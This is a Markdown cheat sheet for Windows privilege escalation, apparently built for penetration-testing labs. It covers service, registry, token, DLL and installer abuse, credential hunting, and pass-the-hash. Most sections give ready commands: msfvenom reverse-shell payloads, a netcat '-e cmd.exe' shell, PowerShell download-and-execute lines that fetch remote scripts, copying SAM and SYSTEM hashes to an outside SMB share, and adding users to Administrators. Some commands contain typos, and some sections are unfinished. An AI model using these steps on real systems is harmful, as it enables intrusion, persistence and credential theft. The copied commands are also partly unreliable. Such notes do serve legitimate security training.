- [Get information about Windows machine](#Get-information-about-Windows-machine)

- [Windows kernel exploits](#Windows-kernel-exploits)

- [Service escalation](#Service-escalation)

- [Weak folder permissions TODO!!!](#Weak-folder-permissions)

- [Token Kidnapping (churrasco)](#Token-Kidnapping)

- [Token impersonation](#Token-impersonation)

- [Metasploit](#Metasploit)

- [Hardcoded passwords](#Hardcoded-passwords)

- [dll Hijacking](#dll-hijacking)

- [Hot Potato/Rotten Patato](#Hot-Potato)

- [Alternate Data Streams](#Alternate-data-streams)

- [Runas](#runas)

- [Impersonation Privileges](#Impersonation-Privileges)
  
- [Registers overview](#Registers-overview)

- [Running powerup for privesc](#Running-powerUp-for-privesc)

- [Check user installed programs](#Check-user-installed-programs)

- [Startup Application](#Startup-application)

- [Enumeration Powerview](#Enumeration-powerview)

- [Enumeration Bloodhound]($Enumeration-bloodhound)

- [Password](#Password)

- [Scheduled tasks](#Scheduled-tasks)

- [Insecure GUI Apps](#Insecure-GUI-Apps)

- [Enumerating Applications and Patch Levels](#Enumerating-Applications-and-Patch-Levels)

- [Enumerating Unmounted Disks](#Enumerating-Unmounted-Disks)

- [Tools](#Tools)

--------------------------------------------------------------------------------------------------------------------------------------
# Get information about Windows machine

## Basic enumeration

### Info about host

- Check host name
```
hostname
```

- Check information about a computer and  operating system,  operating system configuration, security information
```
systeminfo

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```

### Info about user

- Check username
```
echo %username%
```

- Displays user, group and privileges information for the user who is currently logged on to the local system
```
whoami

whoami /priv

whoami /groups
```

- Adds modifies user accounts or displays user account information.
Applies To: Windows Server 2003, Windows Vista, Windows Server 2008, Windows Server 2003 R2, Windows Server 2000, Windows Server 2012, Windows Server 2003 with SP1, Windows 8
```
net users

net user <user_name>

net localgroup

net localgroup administrators
```

### Info about network interfaces and routing table

- Displays all current TCP/IP network configuration
```
ipconfig /all
```

- Displays and modifies the entries in the local IP routing table
Applies To: Windows Server 2003, Windows Vista, Windows XP, Windows Server 2008, Windows 7, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2000, Windows Server 2012, Windows 8
```
route print
```

- Displays and modifies entries in the Address Resolution Protocol
Applies To: Windows 7, Windows Server 2008 R2, Windows Server 2012, Windows 8
```
arp -A
```

### Info about network connections and the firewall rules
```
netsh firewall show state

netsh firewall show config
```

### Info about scheduled tasks running processes started services and installed drivers.

- Schedules commands and programs to run periodically or at a specific time.
Applies To: Windows Server 2008, Windows Server 2012, Windows 8
```
schtasks /query /fo LIST /v
```

- Displays a list of currently running processes on the local computer or on a remote computer
Applies To: Windows Server 2003, Windows XP, Windows Server 2008, Windows 7, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2000, Windows Server 2012, Windows 8
```
tasklist /SVC
```

- Displays active TCP connections, ports on which the computer is listening
Applies To: Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, Windows 8
```
netstat -ano
```

### Info about scheduled tasks Windows managment instrumentation 

- Displays WMI information inside an interactive command shell
Applies To: Windows Vista, Windows Server 2008, Windows 7, Windows Server 2008 R2, Windows Server 2012, Windows 8

- check patch
``` 
wmic qfe

wmic qfe get Caption,Description,HotFixID,InstalledOn
```
- check logical disk
```
wmic logicaldisk get caption,description,providername

wmic logicaldisk get caption
```

### Info about antivirus and firewall

- Communicates with the Service Controller and installed services.

Applies To: Windows Server 2003, Windows Vista, Windows Server 2008, Windows 7, Windows Server 2003 with SP2, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8

- Check windows defender status
```
sc query windefend
```

- Check all services status
```
sc queryex type= service
```
- Display or modify the network configuration of a currently running computer.
- Applies To: Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows 8
- Check firewall status
```
netsh advfirewall firewall dump

netsh firewall show state

netsh firewall show config
```

### Read hidden files
```
gci -force
```

-----------------------------------------------------------------------------------------------------------------------------------

# Windows kernel exploits

## Windows kernel exploits resources
- https://github.com/SecWiki/windows-kernel-exploits

--------------------------------------------------------------------------------------------------------------------------------------

# Service escalation

## Service escalation unquoted service path

When a service is started Windows will search for the binary to execute. The location of the binary to be executed is declared in the binPath attribute. If the path to the binary is unquoted, Windows does not know where the binary is located and will search in all folders, from the beginning of the path.

So, if we want to exploit this misconfiguration, three conditions have to be met:
- The service path is unquoted;
- The service path contains space; and
- We have write permission in one of the intermediate folders.

- Search for check unquoted binary file
```
sc qc unquotedsvc

example output:
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```
For binPath C:\Program Files\Unquoted Path Service\Common Files\service.exe

Windows will search in this order:
- C:\Program.exe
- C:\Program Files\Unquoted.exe
- C:\Program Files\Unquoted Path.exe
- C:\Program Files\Unquoted Path Service\Common.exe
- C:\Program Files\Unquoted Path Service\Common Files\service.exe

- Create msfvenom payload
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<your_kali_machine> lport=<your_port> -f exe -o service.exe

payload with no meterpreter
msfvenom -p windows/reverse_tcp lhost=<your_kali_ip> lport=<your_kali_port> -f exe -o service.exe
```

- Store payload in the:
```
C:\Program Files\Unquoted Path Service\service.exe
```

- Setting up listener with metaspoloit
```
use multi/handler
```
- exploit

- Execute the payload by starting the service:
```
sc start unquotedsvc
```
## Insecure Service Permissions
- check which services we have permissions for logged in users
```
accesschk64.exe -uwcqv "user" *

example output

RW daclsvc
[...]
```

- If we have permissions on the service we can change the the executable file location on the target system. 
Let’s create a payload and upload to target system.
```
msfvenom -p windows/shell_reverse_tcp lhost=<LISTENER_IP> lport=<LISTENER_PORT> -f exe -o common.exe
```

- We can change the service executable file in the PATH
```
sc config daclsvc binpath="c:\users\user\tmp\common.exe
```

- Check new path
```
sc qc daclsvc
```

- setup multi/handler

- run service
```
net start daclsvc
```

## Service escalation binpath

- Running accesschk
Check all services with RW Access by everyone
```
accesschk64.exe -uwcv Everyone *
```
- check service
```
accesschk64.exe -wuvc service_name
```
- check binaryPath name
```
sc qc service_name
```
- change the configuration 
```
sc config service_name binpath= "net localgroup administrators user /add"
```
- sc start service_name

- check admin group
```
net localgroup administrators
```

## Service escalation registry
- regsvc(Register service) Check we have fullcontrol over Register key 
```
powershell -ep bypass
```
- In powershell prompt type:
```
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- Check output access in NT AUTHORY\INTERACTIVE filed, for example:
```
"NT AUTHORITY\INTERACTIVE" has "FullContol" permission over the registry key.
```
- create malicious file with:
```
cmd.exe /k net localgroup administrators user /add
```
- compile file via migw32
```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe


* installation sudo apt install gcc-mingw-w64
 ```
- Place x.exe in C:\Temp folder
- Type in command prompt
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f

sc start regsvc
```
- Confirm that the user was added to the local admin group by typing the following command
```
net localgroup administrators
```

## Service escalation executeable file
- Open command prompt and type
```
C:\Users\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```
Everyone user group has "FILE_ALL_ACCESS" permission on the filepermservice.exe file

- In command prompt type:
```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```
- Confirm that the user was added to the local admin group by typing the following command
```
net localgroup administrators
```
## Insecure Service Executables
-
- Check services privileges
```
sc qc filepermsvc
```
- Use accesschk.exe for check service
```
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
```
- Replace exe with reverse

## Insecure registery permissions
- Check services
```
Wmic service get name | findstr /i /v "C:\Windows\\"
```

- If there is a service and users has full control permission on the service

- examaple check for regsvc
```
subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\regsvc" /display

example output: 
[...]
BINARY_PATH_NAME : "C:\Program Files\Insecure Registry Service\insecureregisteryservice.exe"
[...]
```

- Create a payload for get a reverse tcp connection and upload to target system
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip> lport=<your_port> -f exe -o common.exe
```
- Chance the BINARY_PATH_NAME in registery records
```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\user\AppData\Local\Temp\common.exe" /f
```

- Check the BINARY_PATH_NAME is updated

- Start the service
```
net start regsvc
```

--------------------------------------------------------------------------------------------------------------------------------------

# Weak folder permissions

If a user has write permission in a folder used by a service, he can replace the binary with a malicious one. When the service is restarted the malicious binary is executed with higher privileges.

- Check folder permissions
```
TO DO
```

- Folder permissions exploitation
```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"

sc start filepermsvc
```

## service

--------------------------------------------------------------------------------------------------------------------------------------

# Token Kidnapping

##  Token Kidnapping Description

Network Service account is a special built-in account that has reduced privileges similar to an authenticated user account. This limited access helps safeguard the computer if an attacker compromises individual services or processes. Basically, Server 2003 allows for the NETWORK SERVICE and LOCAL SERVICE accounts to impersonate the SYSTEM account, if this privilege is enabled.

- check user
```
whoami /all

are you nt authority\network service?
```

- Check SeImpersonatePrivilege privilege is enabled?
```
whoami /priv
```

- Upload churrasco.exe
```
https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
```

- Create user *add user to localgroup Administrator*
```
churrasco.bin "net user oscp oscp /add && net localgroup Administrators oscp /add"
```

- Create connection *nc connection*
```
churrasco.exe "nc.exe <your_machine_ip> <your_machine_port> -e cmd.exe"
```

- Create reverse shell
```
msfvenom -p windows/shell_reverse_tcp lhost=<your_ip_address> lport=<your_port> -f exe -o revshell.exe
upload revshell.exe to machine
```

- churrasco.exe -d "C:\revshell\exe\path\"

- run netcat listener on kali machine
```
nc -lnvp xyz
```

## Token kidnapping case study one
- on Windows machine create c:\temp folder
- on linux machine run smb server:
```
python smbserver share smb
```
-move churrasco.exe to smb folder
-on windows machine
```
copy \\<kali_ip>\share\churrasco.exe
```
- create msfvenom payload
```
msfvenom -p windows/shell_reverse_tcp lhost=<kali_ip> lport=4444 -f exe -o rs.exe
```
send rs.exe via smb and run:
```
churrasco.exe -d "C:\temp\rs.exe"
```
-----------------------------------------------------------------------------------------------------------------------------------
# Token impersonation

## Token impersonation description
- Tokens are temporary keys allow you access to a system/network without having to provide credentials each time you access the file.
 There are two types of token:
 
 Delegate: create for logging into a machine or using Remote Desktop
 Impersonate: attaching a network drive or a domain logon script
 
 ## Token impersonation exploitation
 - meterpreter
 ```
getuid
 
load incognito
 
list_tokens -u
 
  - Check for available tokens - 
  
impersonate_token example\\token
 
shell
```
- Check whoami
```
whoami
```
-----------------------------------------------------------------------------------------------------------------------------------

# Metasploit

## Local Exploit Suggester
```
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> run
msf> use exploit/windows/local/ms10_015_kitrap0d (for example)
msf> options
msf> set session x
msf> set lhost
msf> set lport
msf> run
```
--------------------------------------------------------------------------------------------------------------------------------------

# Hardcoded passwords

## Search for password
```
findstr /si password *.txt
findstr /si password *.xml
  findstr /si password Groups.xml
findstr /si password *.ini
findstr /si password *.ini *.txt **config
```

## Search passwords in config files
```
dir /s *pass* == *cred* == *vnc* == *config*
```

## Search password in all files
```
findstr /spin "password" *.*
```

## Search password in common config file
```
C:\sysprep.inf
C:\sysprep\sysprep.xml
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini
```
## Search password in registers
- VNC
```
  reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password
```

- Windows autologin
```  
  reg query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

- SNMP Parameters
```  
  reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

- Putty
```
  reg query" HKCU\Software\SimonTatham\PuTTY\Sessions"
```

- Other
```
  reg query HKLM /f password /t REG_SZ /s

  reg query HKCU /f password /t REG_SZ /s
```
-------------------------------------------------------------------------------------------------------------------------------------------------------

# dll Hijacking

## Description
When windows operation system run service or application look's for dll's and if dll does not exist we can set malicious dll. We have to check the path is writeable and dll does not exists.

## Run process monitor
- Add filter conditions
'''
Result is NAME NOT FOUND then
Path ends with .dll then Include
'''

- Run dll process from command line
```
sc start dllsvc
```

- Stop dll process from command line
```
sc stop dllsvc
```
- Check procmonitor again

- Create malicious dll file
```
x86_64-w64-mingw32-gcc your_file_name .c -shared -o your_file_name.dll
```
- start and stop dllsvc
```
sc stop dllsvc & sc start dllsvc
```
----------------------------------------------------------------------------------------------------------------------------------------------------------------

# Hot Potato
Technique is actually a combination of two known windows issues  like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.

NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command  as SYSTEM.
https://foxglovesecurity.com/2016/01/16/hot-potato/

#### Important
Attack can only be done if attackers current account has the privilage to impresonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

## Authenticated user hot potato
- https://github.com/foxglovesec/Potato
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
Potato.exe -ip [IP] -cmd "C:\\Windows\\System32\\cmd.exe -K net localgroup administrator [username] /ADD" -disable_exhaust true -disable _defender true

## Hot Potato via powershell

- https://github.com/Kevin-Robertson/Tater

## Juicy potato
- https://github.com/ohpe/juicy-potato
- https://github.com/ohpe/juicy-potato/releases

- Execute juicy potato
```
./jp.exe -t * -p test.bat -l 4445

test.bat:
powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.49:9090/Invoke-PowerShellTcp.ps1')
```
--------------------------------------------------------------------------------------------------------------------------------------
# Alternate data streams
Alternate Data Streams (ADS) are a file attribute only found on the NTFS file system. It is a way to hide some information in file.
- check file for ADS
```
dir /R

example
more < hm.txt:root.txt:$DATA
```
# Runas

- Check runas /list
```
cmdkey /list
```
- Run reverseshell as administrator
```
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "powershell IEX (New-Object Net.WebClient).DownloadString('http://<your_ip>reverse.ps1')"
```

- Run exe as admin
```
runas /savecred /user:admin C:\reverse.exe
```
--------------------------------------------------------------------------------------------------------------------------------------
# Impersonation Privileges

## Impersonation Privileges basic
- execute command on command line:
```
whoami /priv

[...]
SeImpersonatePrivilege Enable
[...]
```
- execute command on meterpreter:
```
meterpreter> getprivs

[...]
SeImpersonatePrivilege Enable
[...]
```
## Usefull resources
- https://github.com/gtworek/Priv2Admin

--------------------------------------------------------------------------------------------------------------------------------------
# Registers Overview

## Regsvc esclation
```
powershell -ep bypass
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```
- Check if output suggest that user belong to "NT AUTORITORY \INTERACTIVE" has fullcontrol permission over the registers key
```
NT AUTORITORY \INTERACTIVE Allow FullControl
```
- In case we have full control over register key, we can compile maliicious file. Copy C:\Users\User\Desktop\Tools\Source\windows_service.c to your kali machine.

- Connecto ftp server in C:\Users\User\Desktop\Tools\Source\ directory
```
ftp <kali_linux_ip>
put windows_service.c
```

- Modify method int Run() in windows_service.c file
```
change whoami command to:
cmd.exe /k net localgroup administrators user /add

!!! Change user to your user-name !!!!
```

- Compile C file
```
w64-ming32-gcc windows_service.c -o x.exe
```

- Place x.exe file in C:\Temp

- In Windows command prompt 
```
req add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\tmp\x.exe /f
```
- start regsvc
```
sc start regsvc
```

- confirm that user was add to the local admin group
```
net localgroup administrators
```

## Registry escalation autorun

- Query the registry for autorun executables
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

- Use accesschk and check executables is writeable by everyone
```
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
- Check correct (e.g RW Everyone) writes

### Exploitation
- msfconsole
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <your_ip>
run
```
- Create malicious file
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<your_ip> -f exe -o program.exe
```
- Copy program.exe to windows machine
- Place program.exe in:
```
C:\Program Files\Autorun Program
```

- for example
```
copy C:\reverse.exe "C:\Program Files\Autorun Program.exe" /Y
```

- Now have to wait for administrator login

## Registry escalation AlwaysInstallElevated
Windows OS comes installed with a Windows Installer engine which is used by MSI packages for the installation of applications. These MSI packages can be installed with elevated privileges for non-admin users

### Check registers
- Check register HKLM in CMD
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

alternative 
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Desire output is: "AlwaysInstallElevated” value is 1

- Check register HKCU in CMD
```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

Desire output is: “AlwaysInstallElevated” value is 1
```


### Create malicious payload
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[your_ip] -f msi -o setup.msi
```

### msfconsole steps
- use multi/handler
- set payload windows/meterpreter/reverse_tcp
- set lhost [your_ip]
- run

### on widnows
- copy setup.msi to C:\Temp
- in CMD type: 
```
msiexec /quiet /qn /i C:\Temp\setup.msi
```

## Registry - Passwords
- search registry for keys and values contain the word "password''
```
reg query HKLM /f password /t REG_SZ /s
```

- Specific key to find AutoLogon credentials
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```

- winexe on kali
```
winexe -U 'admin%password' //10.10.164.203 cmd.exe
```
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------
# Running powerUp for privesc
- Go to folder where powerUp.p1 is

- Turn off execution policy
```
powershell -ep bypass 
```

- Run powerUp.p1
```
Invoke-AllChecks
```
---------------------------------------------------------------------------------------------------------------------------------------
`
# Check user installed programs

## User installed programs
(run in powershell)
```
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallDate
```

## List user installed application (use wmic)
```
wmic product get name, version, vendor

wmic gfe get Caption, Description, HotFixID, InstalledOn
```

---------------------------------------------------------------------------------------------------------------------------------------
# Startup application
- Check startup appplication
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
- Check permission

- Exploitation
- msfconsole
- use multi/handler
- set payload
```
set payload windows/meterpreter/reverse_tcp
```
- run
- create payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip address] -f exe -o x.exe
```
- Place exe in correct directory
```
cp x.exe “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```
- Wait for admin login
---------------------------------------------------------------------------------------------------------------------------------------

---------------------------------------------------------------------------------------------------------------------------------------
# Password 

### SAM SYSTEM
- The SAM and SYSTEM files can be used to extract user password hashes. (copy via samba)
```
copy C:\Windows\System32\config\SAM \\10.10.10.10\kali\
copy C:\Windows\System32\config\SYSTEM \\10.10.10.10\kali\
```

- Clone creddump7 repository and use it to dump out the hashes from the SAM and SYSTEM files:
```
git clone https://github.com/Neohapsis/creddump7.git
pip install pycrypto
python2 creddump7/pwdump.py SYSTEM SAM
```
- Crack NTLM
```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```
  
### Passing the Hash
- Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password: 
(Remember the full hash includes both the LM and NTLM hash, separated by a colon)
```
pth-winexe -U 'admin%hash' //<MACHINE_IP> cmd.exe
```
---------------------------------------------------------------------------------------------------------------------------------------
# Scheduled tasks
- Enumerate Scheduled Tasks
```
schtasks /query /fo LIST /v
```

---------------------------------------------------------------------------------------------------------------------------------------
# Insecure GUI Apps

- Check running programs
```
tasklist /V |
```
---------------------------------------------------------------------------------------------------------------------------------------
# Enumerating Applications and Patch Levels

- Enumerate all installed applications
```
wmic product get name, version, vendor
```
- Enumerate sytem updates
```
wmic gfe get Caption, Description, HotFixID, InstalledOn
```


--------------------------------------------------------------------------------------------------------------------------------------
# Enumerating Unmounted Disks
```
mountvol
```
--------------------------------------------------------------------------------------------------------------------------------------
# Enumerating Device Drivers and Kernel Modules
```
powershell

driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```

```
Powershell

Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "text"}
```

--------------------------------------------------------------------------------------------------------------------------------------
# Tools

- PowerShell

  - Sherlock
    - https://github.com/sherlock-project/sherlock
  - PowerUp
    - https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
  - jaws-enum
    - https://github.com/411Hall/JAWS

- Executables
  - winPEAS
    - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
  - Seatbelt
    - https://github.com/GhostPack/Seatbelt
  - Watson
    - https://github.com/rasta-mouse/Watson
  - SharpUp
    - https://github.com/GhostPack/SharpUp
  
- Others
  - exploit suggester (metasploit)
    - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
  - exploit suggester (local)
    - https://github.com/mzet-/linux-exploit-suggester
